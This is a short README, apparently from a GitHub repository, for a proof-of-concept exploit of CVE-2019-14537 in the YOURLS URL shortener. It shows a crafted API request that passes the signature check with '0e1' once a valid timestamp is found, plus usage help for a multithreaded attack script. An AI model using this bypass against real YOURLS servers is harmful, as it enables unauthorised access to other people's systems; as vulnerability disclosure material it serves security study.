# YOURLS: CVE-2019-14537 PoC

![alt text](https://raw.githubusercontent.com/Wocanilo/CVE-2019-14537/master/poc_preview.png)

When you get a valid timestamp you will be able to make requests to the api. 

http://domain.com/yourls-api.php?signature=0e1&action=db-stats&timestamp=VALID_TIMESTAMP

## Usage

```
usage: main.py [-h] [--vhost VHOST] [--threads THREADS] [--path PATH]
               [--port PORT]
               [ip]

CVE-2019-14537 PoC

positional arguments:
  ip                 Yourls IP

optional arguments:
  -h, --help         show this help message and exit
  --vhost VHOST      host name (domain name)
  --threads THREADS  number of threads (default: 10)
  --path PATH        yourls-api.php path (default: /yourls-api.php)
  --port PORT        port (default: 80)
```
